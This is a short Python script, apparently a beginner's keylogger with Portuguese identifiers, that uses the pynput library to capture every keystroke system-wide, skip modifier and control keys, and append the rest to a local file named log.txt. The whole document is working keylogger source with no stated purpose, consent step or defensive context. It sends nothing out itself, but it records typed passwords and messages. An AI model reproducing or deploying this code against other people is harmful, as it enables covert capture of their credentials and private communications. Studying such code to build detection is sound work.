from pynput import keyboard

IGNORAR = {

    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.tab,
    keyboard.Key.cmd,
    keyboard.Key.backspace,
    keyboard.Key.esc,
    keyboard.Key.enter
}

def on_press(key):
    if key not in IGNORAR:
        try:
            with open("log.txt", "a") as f:
                f.write(key.char)
        except AttributeError:
            with open("log.txt", "a") as f:
                f.write(f" {key} ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()